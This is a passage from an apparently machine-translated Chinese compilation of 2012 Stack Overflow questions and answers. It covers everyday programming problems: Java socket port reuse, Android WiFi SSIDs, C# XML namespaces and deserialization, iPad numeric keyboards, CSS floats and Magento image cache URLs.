            BufferedReader myInput = new BufferedReader(new InputStreamReader(skt.getInputStream()));
            PrintStream myOutput = new PrintStream(skt.getOutputStream());

            String buf = myInput.readLine();
            System.out.println("Server readLine");
            if(buf!=null)
            {
                System.out.println("Buf = " + buf);
                myOutput.print("Got it?");
            }
            else
            {
                System.out.println("Nothing returned in server sidex`x  ");
            }
            skt.close();
            System.out.println("Server shutdown");
        }
        catch(IOException e)
        {
            e.printStackTrace();
            System.out.println("Whooops");
        }
    }

} 
```

正如你所看到的清​​理我写的：

```
 skt.close(); 
```

但也许这不是你的问题，也许你的问题是我 1 小时前遇到的问题；）我曾经运行过一个程序，但结果不是我所期望的，所以我修改它并再次运行它，但端口很忙或已经在采用！我在日食上做什么？在出现错误的控制台下，窗口右侧有红色矩形按钮！它说“终止”。如果您单击该端口，您的端口将是免费的。顺便说一句，不要忘记检查（服务器/客户端）双方的控制台。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T14:33:36.273

当进程已经终止时，您也可以收到此错误消息。TCP 有一个时间等待状态。此状态用于确保不会将来自旧连接的 TCP 数据包传送到侦听同一端口的新进程。通常你应该使用[`ServerSocket.setRuseAddress(true)`](http://docs.oracle.com/javase/1.4.2/docs/api/java/net/ServerSocket.html#setReuseAddress%28boolean%29)来避免这个问题。

# android - Android：如何确定连接了哪个 Wi-Fi 网络

> ID：12820768
> 
> 赞同：-1
> 
> 时间：2012-10-10T13:41:26.263
> 
> 标签：android, connection, wifi

我知道如何确定 wi-fi 连接是否是活动连接。但是，有人可以告诉如何确定当前活动的 wi-fi 网络吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:44:09.803

使用`WifiManager.getConnectionInfo()`. 这将返回一个`WifiInfo`对象，其中包含您需要的有关活动 wifi 连接的所有信息；特别是`WifiInfo.getSSID()`会给你SSID。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:55:19.157

```
WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
String BSSID=wifiManager.getConnectionInfo().getBSSID(); 
```

# c# - Windows Phone 中带有关闭按钮的 WebBrowser

> ID：12820774
> 
> 赞同：0
> 
> 时间：2012-10-10T13:41:44.157
> 
> 标签：c#, windows-phone-7

在我的 Windows Phone 应用程序中，我需要在应用程序首次启动时显示一个**带有关闭按钮的网络浏览器。**网络浏览器放置在登录页面上，我如何在浏览器上放置关闭按钮，以便用户可以通过单击该按钮来关闭该网络浏览器以查看登录页面上的内容。网络浏览器旨在显示广告。我尝试使用弹出窗口，但弹出窗口只能有一个孩子。

我怎么能在windows phone中做到这一点，请帮助！！！

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:05:03.677

如果您想将它们放入 PopUp - 将它们包装到`StackPanel`. 所以可以放入PopUp。

```
 <StackPanel>
       <Button/>
       <WebBrowser/>
    </StackPanel> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T15:50:51.040

您可以尝试在 codeplex 上使用 Coding4Fun 工具包中的一些控件。

[http://coding4fun.codeplex.com/](http://coding4fun.codeplex.com/)

# c# - 使用 C# 和 Linq 即时生成 kml 文件

> ID：12820775
> 
> 赞同：3
> 
> 时间：2012-10-10T13:41:54.860
> 
> 标签：c#, asp.net, xml, linq, kml

> **可能重复：**
> [如何为 XDocument 设置默认 XML 命名空间](https://stackoverflow.com/questions/2874422/how-to-set-the-default-xml-namespace-for-an-xdocument)

我正在尝试在 Asp.net C# 中编写一段代码，以便即时创建 KML 文件并将其存储在特定路径中。当我想添加 kml 标签的 xmlns="http://earth.google.com/kml/2.2" 属性时，代码会出错（见下文）。我尝试用“id”之类的另一个词替换 xmlns，它工作得很好。它与“xmlns”这个词有关吗？？！对我来说很奇怪。

如果您了解问题所在，请为我提供解决方案...谢谢！

我的代码：

```
XDocument doc = new XDocument(
        new XDeclaration("1.0", "utf-8", ""),
        new XComment("This is comment by me"),
        new XElement("kml", new XAttribute("xmlns", "http://earth.google.com/kml/2.2"),
        new XElement("Document",
        new XElement("Name", "something"), new XElement("Placemark",
        new XAttribute("id", "1"),
        new XElement("title", "something"),
        new XElement("description", "something"),
        new XElement("LookAt",
        new XElement("Longitude", "49.69"),
        new XElement("Latitude", "32.345")), new XElement("Point", new XElement("Coordinates", "49.69,32.345,0"))))));
        doc.Save(Server.MapPath(@"~\App_Data\markers.xml")); 
```

它给出的运行时错误：

> 前缀 '' 不能在同一起始元素标记中从 '' 重新定义为 ' [http://earth.google.com/kml/2.2 '。](http://earth.google.com/kml/2.2)说明：执行当前 Web 请求期间发生未处理的异常。请查看堆栈跟踪以获取有关错误及其源自代码的位置的更多信息。
> 
> 异常详细信息：System.Xml.XmlException：前缀 '' 不能在同一起始元素标记中从 '' 重新定义为 ' [http://earth.google.com/kml/2.2 '。](http://earth.google.com/kml/2.2)

我想创建的 kml 文件：

```
<?xml version="1.0" encoding="utf-8"?>
<!--This is comment by me-->
<kml xmlns="http://earth.google.com/kml/2.2">
  <Document>
    <Name>something</Name>
    <Placemark id="1">
      <title>something</title>
      <description>something</description>
      <LookAt>
        <Longitude>49.69</Longitude>
        <Latitude>32.345</Latitude>
      </LookAt>
      <Point>
        <Coordinates>49.69,32.345,0</Coordinates>
      </Point>
    </Placemark>
  </Document>
</kml> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:51:59.430

先定义命名空间

```
XNamespace n = "http://earth.google.com/kml/2.2";

new XElement(n+"kml")//just do n+ for each underlying elements 
```

你的 XML 结构也是错误的，应该是这样的

```
 XNamespace n = "http://earth.google.com/kml/2.2";
XDocument doc = new XDocument(
new XDeclaration("1.0", "utf-8", ""),
new XComment("This is comment by me"),
new XElement(n+"kml",
 new XElement(n+"Document",
        new XElement(n+"Name", "something"), new XElement(n+"Placemark",
        new XAttribute("id", "1"),
        new XElement(n+"title", "something"),
        new XElement(n+"description", "something"),
        new XElement(n+"LookAt",
        new XElement(n+"Longitude", "49.69"),
        new XElement(n+"Latitude", "32.345")), new XElement(n+"Point", new XElement(n+"Coordinates", "49.69,32.345,0")))))

); 
```

# c# - 反序列化包含无效数据类型的 xml

> ID：12820776
> 
> 赞同：3
> 
> 时间：2012-10-10T13:41:57.067
> 
> 标签：c#, .net, serialization, xml-serialization

我有一个 XML 文件，我需要将其反序列化为与此类似的对象：

```
public class TestObject
{
    public string Name { get; set; }
    public int Size { get; set; }

    public TestObject()
    {
        Name = string.Empty;
        Size = 0;
    }
} 
```

我的反序列化方法如下所示：

```
private TestObject DeserializeConfiguration(string xmlFileName)
{
    XmlSerializer deserializer = new XmlSerializer(typeof(TestObject));
    TextReader textReader = new StreamReader(xmlFileName);
    TestObject testObj = (TestObject)deserializer.Deserialize(textReader);
    textReader.Close();
    return testObj;
} 
```

这对我来说工作得很好，但有时，我得到一个可能包含无效数据类型的 XML 文件（“无效”，我的意思是关于它应该映射到的对象属性的类型）。例如，如果我的 XML 文件如下所示：

```
<?xml version="1.0" encoding="utf-8"?>
<TestObject xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Name>Orion</Name>
  <Size>abc</Size>
</TestObject> 
```

显然，我无法将“abc”转换为对象的整数 Size 属性。当我尝试反序列化它时，我看到一个 InvalidOperationException 并且毫不奇怪，InnerException 是“输入字符串的格式不正确”。是否可以捕获此错误，为我的对象的该属性使用默认值并继续反序列化 XML 文件的其余部分？如果没有，谁能告诉我在反序列化过程中处理无效数据是否存在普遍认为的“最佳实践”？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:45:51.313

您需要做的是在反序列化之前验证传入的 XML。基本上，您希望避免处理格式错误的 XML。验证后，反序列化器至少可以确保所有传入的 XML 都是可反序列化的。

您可以创建一个包含有效 XML 定义的 XML 模式，然后首先使用 XSD（XML 模式定义）验证传入的 XML（另请参见[http://www.codeguru.com/csharp/csharp/cs_data /xml/article.php/c6737/Validation-of-XML-with-XSD.htm](http://www.codeguru.com/csharp/csharp/cs_data/xml/article.php/c6737/Validation-of-XML-with-XSD.htm)了解更多详细信息）。

祝你好运！

# objective-c - AFNetworking 在返回 JSON 时将我的字符串值转换为整数？

> ID：12820778
> 
> 赞同：1
> 
> 时间：2012-10-10T13:42:03.923
> 
> 标签：objective-c, ios, cocoa-touch, afnetworking

我创建了一个休息服务，其输出形式为

```
 {
        "id": "1905",
        "groupId": "724",
        "giftingId": null,
        "name": "This is a great service",
   } 
```

我正在使用 AFNetworking http 客户端调用此服务。它的输出是

```
 {
     name = "This is a great service";
     id = 1905;
     groupId = 724;
     giftingId = "<null>";
  } 
```

当它为空时，我无法解析那个赠送的 ID。我只是想将数据解析为 NSString？当 JSON 作为字符串发送时，为什么将它们解析为整数？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T15:21:25.843

我认为您误解了您在输出中看到的内容。输出 NSDictionary 时，它不会为所有字母和数字的任何字符串打印双引号。`This is a great service`有空格和`<null>`尖括号。

我很确定字典打印为：

```
{
    name = "This is a great service";
    id = 1905;
    groupId = 724;
    giftingId = "<null>";
} 
```

实际上是：

```
@{
    @"name" : @"This is a great service",
    @"id" : @"1905",
    @"groupId" : @"724",
    @"giftingId" : [NSNull null],
} 
```

我认为这里的解决方案是处理和检测 NSNull。`[JSON[@"giftingId"] isEqual:[NSNull null]]`应该能够检测是否`giftingId`是 NSNull。

如果你没有最新的 Xcode，那么你应该使用`[[JSON objectForKey:@"giftingId"] isEqual:[NSNull null]]`

# ipad - 在 ipad 上强制数字键盘用于 contenteditable 元素

> ID：12820788
> 
> 赞同：22
> 
> 时间：2012-10-10T13:42:29.950
> 
> 标签：ipad, html, contenteditable

我在我们的计时应用程序的几个部分中使用了 contenteditable。由于我们正在记录时间，自然我希望键盘自动切换到 ipad 用户的数字键盘。我尝试将所有属性添加到我能想到的元素中，例如：

*   类型=数字
*   类型=电话
*   模式=[0-9]*

但 ipad 仍然加载默认键盘。

这是一个例子：

```
<div class="editable validate numbers-only" contenteditable="true" type="number" pattern="[0-9]*">3</div> 
```

有什么技巧可以用来为我的 ipad 用户显示数字键盘吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2019-11-14T20:38:52.270

您可以`inputmode`在 contenteditable 元素上设置属性来控制显示哪个键盘，至少在 chrome 和移动 safari 中是这样。例如：

```
<div contenteditable=true inputmode=decimal><div> 
```

我在这里测试了更多示例：[https ://notatoad.github.io/inputmodes.com/](https://notatoad.github.io/inputmodes.com/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-08-28T15:08:05.673

我不确定您在这里如何使用键盘？意思是，用户是在添加/更新时间还是什么？如果有，请将输入类型设为数字。这将告诉浏览器（safari）这是仅用于数字的输入，它将告诉 iOS 自动显示数字键盘。

```
<input type="number"> 
```

查看我的有趣项目，称为体重计算器。检查它将如何防止输入中的任何其他键以及它会在移动设备中显示数字键盘。 [体重计算器](https://weight-calculator.now.sh/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-09-22T10:24:26.287

```
<form>
    <input type="text" pattern="\d*">
    <button type="submit">Submit</button>
</form> 
```

然后

```
<div class="editable validate numbers-only" contenteditable="true" type="text" pattern="\d*">3</div> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-01-14T20:43:37.930

我在[这篇](https://stackoverflow.com/questions/6178556/phone-numeric-keyboard-for-text-input)文章中读到，您可以使用 \d* 模式使数字键盘出现在 iOS 上，因此带有数字键盘的基本表单如下所示：

```
<form>
    <input type="text" pattern="\d*">
    <button type="submit">Submit</button>
</form> 
```

这应该会导致输入表单信息时在 iOS 上自动出现数字键盘。

现在，我很确定我们可以推断这一点并说我们可以在 contenteditable div 上使用 \d* 来回答这个问题：

`<div class="editable validate numbers-only" contenteditable="true" type="text" pattern="\d*">3</div>`

我希望这对你有用吗？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-12-12T13:49:07.620

```
<input type="tel" pattern="[0-9]*" novalidate> 
```

这应该会在 Android/iOS 手机浏览器上为您提供漂亮的数字键盘，在桌面浏览器上禁用浏览器表单验证，不显示任何箭头微调器，允许前导零，并允许在桌面浏览器和 iPad 上使用逗号和字母。

# html - 调整插入内容的 svg 图像大小：url()

> ID：12820790
> 
> 赞同：6
> 
> 时间：2012-10-10T13:42:35.547
> 
> 标签：html, css, svg

好的，我得到的是以下内容：通过 css 插入到 html 中的具有不同宽度/高度的多个 svg 图像。我想将它们全部缩放到相同的宽度，但这不起作用（至少在 Safari、Chrome 和 Firefox 中不起作用）。

**html:**

```
<h4 class="before" id="foo">Foo</h4>
<h4 class="before" id="bar">Bar</h4>
<h4 class="before" id="foobar">Foobar</h4> 
```

**CSS：**

```
.before:before { width: 20px; }
#foo:before { content:url('foo.svg'); }
#bar:before { content:url('bar.svg'); }
#foobar: before { content:url('foobar.svg'); } 
```

我如何调整这些 svg 图像的大小，以便它们以 20px 的宽度显示（但不要更改 svg 本身）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T15:56:47.377

如果您知道高度将是多少，您可以将图像设置为伪元素的背景并声明`background-size: 20px auto;`，但您需要知道伪元素本身高度的确切大小或更大。

除此之外，我无法找到一种方法让它完全只在 CSS 中工作。如果您可以访问服务器端编码，则可以打开 SVG 文件并自动找出大小。

# css - 如何使 div 在居中的 div 内向左/向右浮动

> ID：12820799
> 
> 赞同：4
> 
> 时间：2012-10-10T13:43:06.163
> 
> 标签：css, html, center

当我想在居中的父 div 内将子 div 向左或向右浮动时，整个设计会向左或向右移动，具体取决于浮动。那么，如何浮动一个子 div 并使居中的父 div 居中。

HTML：

```
<div id="parent">
<div id="child-left"></div>
<div id="child-right"></div>
</div> 
```

CSS：

```
#parent{
    padding: 0 auto;
    width: 600px;
}
#child-left{
    float: left;
    width: 300px;
}
#child-right{
    float: right;
    width: 300px;
} 
```

为什么父 div 向左/向右移动，而不是留在中心？以及如何使它保持在中心？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-10T13:47:03.877

查看[演示](http://jsbin.com/iramom/1/edit)

```
#parent{
    padding: 0px, auto;
    width: 605px;
  height:200px;
  border:solid 1px #f00;
}
#child-left{
  float: left;
  width: 300px;
  height:200px;
  border:solid 1px #0F0;
}
#child-right{
    float: right;
    width: 300px;
   height:200px;
  border:solid 1px #00F;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-10T13:44:59.227

对于父 div，您使用此 css 代码

```
margin:0 auto;
width:980px; 
```

对于孩子，您可以使用此代码进行浮动

```
float:right or left;
width:anypx; 
```

最好的祝福

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T13:44:57.867

要使父元素居中，请使用`margin: 0 auto;`

```
#parent{
    margin: 0 auto;
    width: 600px;
} 
```

您的代码中还有很多拼写错误（智利不是孩子），并且缺少`>`符号，请在继续之前修复它们

[一个工作的 JSFiddle（点击我）](http://jsfiddle.net/7fuUe/)

# php - 我可以在 Spotify 应用程序中使用 Facebook PHP SDK 吗？

> ID：12820804
> 
> 赞同：0
> 
> 时间：2012-10-10T13:43:22.707
> 
> 标签：php, facebook, login, sdk, spotify

我需要能够将信息从我的应用程序发布到用户的时间线。现在，我知道如何做到这一点的唯一方法是使用 Facebook PHP SDK。问题是，由于我使用标准的 JavaScript 方式连接 Facebook 的登录，当我尝试使用 PHP SDK 获取用户 ID 时，它说它是 0。有什么方法可以使用 PHP SDK，或者只是无法从 Spotify 应用程序发布到 Facebook？

另外，我是否也可以使用 PHP SDK 来登录，而不是使用如下所示的标准代码：

```
function facebook(){
    auth.authenticateWithFacebook('119914501490688', ['user_about_me', 'user_checkins'], {
        onSuccess : function(accessToken, ttl) {
            console.log("Success! Here's the access token: " + accessToken);
        },
        onFailure : function(error) {
            console.log("Authentication failed with error: " + error);
        },
        onComplete : function() {}
    });
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:57:03.903

您可能需要确保 Spotify 允许访问 Facebook API 端点，方法是将它们添加到您的应用清单文件中。[请参阅https://developer.spotify.com/technologies/apps/tutorial/](https://developer.spotify.com/technologies/apps/tutorial/)教程中的“与外界对话”

# objective-c - Apple LLVM 编译器 3.1 错误？

> ID：12820808
> 
> 赞同：0
> 
> 时间：2012-10-10T13:43:31.850
> 
> 标签：objective-c, xcode, compiler-errors, xcode4.3, box2d

我有 XCode 4.3.3 我已经下载了一个项目，但它无法运行。我收到一个错误：

```
Command /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang failed with exit code 1 
```

请告诉我任何人我该如何解决这个问题？ [我的屏幕在这里](http://s002.radikal.ru/i198/1210/0c/97037ef9a56d.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:48:12.607

查看日志，它说您缺少文件**BBox2DBuilder.mm**，它位于图像中红色文本的上方。

# c# - 列表到数据库

> ID：12820816
> 
> 赞同：0
> 
> 时间：2012-10-10T13:43:54.713
> 
> 标签：c#, database, orm, data-access-layer

我可能离这里很远，这个问题可能与主观接壤，但无论如何。

目前，我用于`IList<T>`将数据库中的信息缓存在内存中，以便可以`LINQ`从中查询信息。我在 SO 上的一些问题的帮助下编写了一个 ORM'ish 层，以便轻松地从数据库中查询我需要的信息。例如：

```
IList<Customer> customers = DB.GetDataTable("Select * FROM Customers").ToList<Customer>(); 
```

它工作正常。我还有扩展方法来对这些列表中的单个项目进行 CRUD 更新：

```
DB.Update<Customer>(customers(0)); 
```

再次工作得很好。

现在在我的应用程序的 GUI 层中，特别是在`DataGridView`为用户绑定数据以编辑数据时，我发现自己绕过了这个 DAL 层并直接`TableAdapters`在表单中使用这种打破分层架构的形式，这对我来说有点味道。我还发现我在`TableAdapters`这里和`ILists`那里使用的事实，在我的代码中遵循不同的标准，我想将它们合并为一个。

理想情况下，我希望能够绑定到这些列表，然后让 DAL 为我更新列表的“脏”数据。对我来说，这个过程将涉及以下内容：

1.  遍历任何“脏”项目的列表
2.  对于其中的每一个，查看数据库中是否已经存在具有 PK 的项目
3.  如果（2），则更新，否则插入
4.  最后，执行`Delete FROM * WHERE ID NOT IN('all ids in list')`查询

我不完全确定这是如何在 a 中处理的`TableAdapter`，但我可以看到随着列表中项目的增加，这种方法的性能会显着下降并且很快。

所以我的问题是：

有没有更简单的方法将List**提交到数据库？**请注意提交一词，因为它可能是插入/更新或删除。

我应该转换为`DataTable`吗？例如[这里](https://stackoverflow.com/questions/564366/convert-generic-list-enumerable-to-datatable)

我确信一些更高级的 ORM 会执行这种类型的事情，但是是否有任何 mini-orm（例如 dapper/Petapoco/Simple.data 等）可以为我做到这一点？我想让它保持简单（就像我当前的 DAL 一样）和灵活（如果它完全满足我的需要，我不介意编写 SQL）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:58:29.503

> 目前我使用 IList 将数据库中的信息缓存在内存中，因此我可以使用 LINQ 从它们中查询信息。

Linq 还有一个叫做 Linq-to-Datasets 的部门，所以这不是一个令人信服的理由。

更好地决定你真正想要/需要什么：

*   像实体框架一样的完整 ORM
*   将 DataSet 与 DataDapters 一起使用
*   使用基本的 ADO.NET（DataReader 和 List<>）并实现您自己的更改跟踪。

您可以在某种程度上混合它们，但就像您指出的那样，最好选择一个。

# objective-c - 使用绑定在表中显示来自核心数据多对一关系的值

> ID：12820820
> 
> 赞同：1
> 
> 时间：2012-10-10T13:44:04.970
> 
> 标签：objective-c, core-data

我有一个核心数据项目，它有一个相当简单的数据模型，但有一个功能我无法实现。这是一个非常基本的功能，所以我知道它必须能够实现，但不幸的是，我被难住了。

我不会用项目细节给你带来负担，而是使用员工场景来解释。

这是数据模型

Entity = Employee
Attributes:
firstName
lastName

关系：
年级
部门

实体=年级
属性：
年级

关系：
employeeGrade

实体 = Department
属性：
department

关系：
employeeDepartment

employeeGrade 是与来自 Employee 实体的等级的多对一关系

employeeDepartment 是与 Employee 实体中的部门的多对一关系

所有属性都是字符串。

我有一个表设置为成绩实体添加成绩。

我在等级表下方有另一个表格，用于显示具有在等级表中选择的等级的员工列表。

我想在此表中显示每个员工的名字、姓氏和部门。通过在 IB 中使用数组控制器和绑定，显示名字和姓氏没有问题，但让部门显示对我来说是个问题。正如您可以看到的多对一关系，我无法弄清楚如何使用绑定进行设置，以便员工的部门显示在表中。

我可以轻松地用所有部门填充弹出菜单单元格，但我只想在文本单元格中显示适当的部门

我知道答案一定很简单，但是经过几天的网络搜索和试验，我迷失了方向。

# magento - Magento：加载/使用图像基本 URL 而不是缓存 URL

> ID：12820822
> 
> 赞同：1
> 
> 时间：2012-10-10T13:44:08.370
> 
> 标签：magento, caching, md5, base-url, m2e-pro

**有谁知道如何让 Magento 使用图像的实际基本 URL 而不是缓存的？**

**使用 Magento Community V 1.6.2.0**

如果我查看产品图片的 URL，您会得到类似这样的信息……</p>

/media/catalog/product/cache/1/image/390x/5e06319eda06f020e43594a9c230972d/1/1/1101012001-J-1Front-Man/.jpg

我需要它更像：

/media/catalog/product/1101012001-J-1Front-Man/.jpg

原因是我正在使用 M2EPro 扩展程序，它允许您将在 Magento 中销售/出售的产品与 eBay/Amazon 同步。**问题是 eBay 不允许超过 150 个字符的图像 URL。**MD5 散列和其他混合变量（我相信源自 /app/code/core/Mage/Catalog/Helper/Image.php）使 URL 太长而无法用于我的许多图像。

当 M2EPro 运行时，它会拉取缓存的图像（因为这是 Magento 指定的主图像）。我相信我只需要引用绝对 URL 并且还不能将它们放在一起。

**我见过很多很多类似的问题，这些问题跨越了多年，对此没有明确的答案。如果我首先找到答案，我会在这里发布，但任何帮助都非常非常感谢！**

来自上述 Image.php 文件的当前代码：

```
$this->_baseFile = $baseFile;

        // build new filename (most important params)
        $path = array(
            Mage::getSingleton('catalog/product_media_config')->getBaseMediaPath(),

            Mage::app()->getStore()->getId(),
            $path[] = $this->getDestinationSubdir()
        );
        if((!empty($this->_width)) || (!empty($this->_height)))
            $path[] = "{$this->_width}x{$this->_height}";

        // add misk params as a hash
        $miscParams = array(
                ($this->_keepAspectRatio  ? '' : 'non') . 'proportional',
                ($this->_keepFrame        ? '' : 'no')  . 'frame',
                ($this->_keepTransparency ? '' : 'no')  . 'transparency',
                ($this->_constrainOnly ? 'do' : 'not')  . 'constrainonly',
                $this->_rgbToString($this->_backgroundColor),
                'angle' . $this->_angle,
                'quality' . $this->_quality
        );

        // if has watermark add watermark params to hash
        if ($this->getWatermarkFile()) {
            $miscParams[] = $this->getWatermarkFile();
            $miscParams[] = $this->getWatermarkImageOpacity();
            $miscParams[] = $this->getWatermarkPosition();
            $miscParams[] = $this->getWatermarkWidth();
            $miscParams[] = $this->getWatermarkHeigth();
        }

        $path[] = md5(implode('_', $miscParams));

        // append prepared filename
        $this->_newFile = implode('/', $path) . $file; // the $file contains heading slash

        return $this;
    }

    public function getBaseFile()
    {
        return $this->_baseFile;
    }

    public function getNewFile()
    {
        return $this->_newFile;
    }

    /**
     * @return Mage_Catalog_Model_Product_Image
     */
    public function setImageProcessor($processor)
    {
        $this->_processor = $processor;
        return $this;
    }

    /**
     * @return Varien_Image
     */
    public function getImageProcessor()
    {
        if( !$this->_processor ) {
//            var_dump($this->_checkMemory());
//            if (!$this->_checkMemory()) {
//                $this->_baseFile = null;
//            }
            $this->_processor = new Varien_Image($this->getBaseFile());
        }
        $this->_processor->keepAspectRatio($this->_keepAspectRatio);
        $this->_processor->keepFrame($this->_keepFrame);
        $this->_processor->keepTransparency($this->_keepTransparency);
        $this->_processor->constrainOnly($this->_constrainOnly);
        $this->_processor->backgroundColor($this->_backgroundColor);
        $this->_processor->quality($this->_quality);
        return $this->_processor;
    }

    /**
     * @see Varien_Image_Adapter_Abstract
     * @return Mage_Catalog_Model_Product_Image
     */
    public function resize()
    {
        if (is_null($this->getWidth()) && is_null($this->getHeight())) {
            return $this;
        }
        $this->getImageProcessor()->resize($this->_width, $this->_height);
        return $this;
    }

    /**
     * @return Mage_Catalog_Model_Product_Image
     */
    public function rotate($angle)
    {
        $angle = intval($angle);
        $this->getImageProcessor()->rotate($angle);
        return $this;
    }

    /**
     * Set angle for rotating
     *
     * This func actually affects only the cache filename.
     *
     * @param int $angle
     * @return Mage_Catalog_Model_Product_Image
     */
    public function setAngle($angle)
    {
        $this->_angle = $angle;
        return $this;
    }

    /**
     * Add watermark to image
     * size param in format 100x200
     *
     * @param string $file
     * @param string $position
     * @param string $size
     * @param int $width
     * @param int $heigth
     * @param int $imageOpacity
     * @return Mage_Catalog_Model_Product_Image
     */
    public function setWatermark($file, $position=null, $size=null, $width=null, $heigth=null, $imageOpacity=null)
    {
        if ($this->_isBaseFilePlaceholder)
        {
            return $this;
        }

        if ($file) {
            $this->setWatermarkFile($file);
        } else {
            return $this;
        }

        if ($position)
           $this->setWatermarkPosition($position);
        if ($size)
            $this->setWatermarkSize($size);
        if ($width)
            $this->setWatermarkWidth($width);
        if ($heigth)
            $this->setWatermarkHeigth($heigth);
        if ($imageOpacity)
            $this->setImageOpacity($imageOpacity);

        $filePath = $this->_getWatermarkFilePath();

        if($filePath) {
            $this->getImageProcessor()
                ->setWatermarkPosition( $this->getWatermarkPosition() )
                ->setWatermarkImageOpacity( $this->getWatermarkImageOpacity() )
                ->setWatermarkWidth( $this->getWatermarkWidth() )
                ->setWatermarkHeigth( $this->getWatermarkHeigth() )
                ->watermark($filePath);
        }

        return $this;
    }

    /**
     * @return Mage_Catalog_Model_Product_Image
     */
    public function saveFile()
    {
        $filename = $this->getNewFile();
        $this->getImageProcessor()->save($filename);
        Mage::helper('core/file_storage_database')->saveFile($filename);
        return $this;
    }

    /**
     * @return string
     */
    public function getUrl()
    {
        $baseDir = Mage::getBaseDir('media');
        $path = str_replace($baseDir . DS, "", $this->_newFile);
        return Mage::getBaseUrl('media') . str_replace(DS, '/', $path);
    }

    public function push()
    {
        $this->getImageProcessor()->display();
    }

    /**
     * @return Mage_Catalog_Model_Product_Image
     */
    public function setDestinationSubdir($dir)
    {
        $this->_destinationSubdir = $dir;
        return $this;
    }

    /**
     * @return string
     */
    public function getDestinationSubdir()
    {
        return $this->_destinationSubdir;
    }

    public function isCached()
    {
        return $this->_fileExists($this->_newFile);
    }

    /**
     * Set watermark file name
     *
     * @param string $file
     * @return Mage_Catalog_Model_Product_Image
     */
    public function setWatermarkFile($file)
    {
        $this->_watermarkFile = $file;
        return $this;
    }

    /**
     * Get watermark file name
     *
     * @return string
     */
    public function getWatermarkFile()
    {
        return $this->_watermarkFile;
    }

    /**
     * Get relative watermark file path
     * or false if file not found
     *
     * @return string | bool
     */
    protected function _getWatermarkFilePath()
    {
        $filePath = false;

        if (!$file = $this->getWatermarkFile())
        {
            return $filePath;
        }

        $baseDir = Mage::getSingleton('catalog/product_media_config')->getBaseMediaPath();

        if( $this->_fileExists($baseDir . '/watermark/stores/' . Mage::app()->getStore()->getId() . $file) ) {
            $filePath = $baseDir . '/watermark/stores/' . Mage::app()->getStore()->getId() . $file;
        } elseif ( $this->_fileExists($baseDir . '/watermark/websites/' . Mage::app()->getWebsite()->getId() . $file) ) {
            $filePath = $baseDir . '/watermark/websites/' . Mage::app()->getWebsite()->getId() . $file;
        } elseif ( $this->_fileExists($baseDir . '/watermark/default/' . $file) ) {
            $filePath = $baseDir . '/watermark/default/' . $file;
        } elseif ( $this->_fileExists($baseDir . '/watermark/' . $file) ) {
            $filePath = $baseDir . '/watermark/' . $file;
        } else {
            $baseDir = Mage::getDesign()->getSkinBaseDir();
            if( $this->_fileExists($baseDir . $file) ) {
                $filePath = $baseDir . $file;
            }
        }

        return $filePath;
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T16:25:31.663

我想你可以使用

```
echo Mage::getModel('catalog/product_media_config')
        ->getMediaUrl( $product->getImage() ); 
```

您也可以改用`getSmallImage()`or`getThumbnail()`方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-18T02:54:11.943

您使用的是什么版本的 M2e Pro，我当前的版本是 6，它可以选择使用基本图像而不是图库。如果您的基本图像至少有 500 个像素，则在我的 magento 1.6.2.0 中效果很好

# orm - 使骨干或淘汰赛与 ORM 一起工作

> ID：12820825
> 
> 赞同：1
> 
> 时间：2012-10-10T13:44:14.687
> 
> 标签：orm, backbone.js, knockout.js

对于大型项目，只为 js 端编写模型很乏味，因为我们在服务器端使用 ORM。有没有一种好方法可以轻松地使用服务器端 ORM 让骨干网或淘汰赛？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:52:44.650

如果您使用的是 node.js，您可以遵循[这一点](http://andyet.net/blog/2011/feb/15/re-using-backbonejs-models-on-the-server-with-node/)，并在前端和后端都使用一个 JS obj。

但是对于其他语言，我看不到您如何做到这一点，您必须创建模型并使用休息请求来更改数据。

另外我认为这是正确的方法，因为几乎总是你不需要后端模型所拥有的一切，所以你应该像应用程序一样构建你的前端。

# android - 如何找到所有可用 Android 手机的最小和最大屏幕高度/宽度比？

> ID：12820831
> 
> 赞同：4
> 
> 时间：2012-10-10T13:44:31.320
> 
> 标签：android, android-layout

我希望我的应用程序能够在任何 Android 设备上正确显示，无论屏幕大小、屏幕密度或屏幕高宽比如何。我想支持与 API 8 一样古老的 Android 设备。我可以为纵向、横向和可能的超大屏幕创建单独的布局，但除此之外，我不想为不同的密度或屏幕尺寸创建不同的布局。

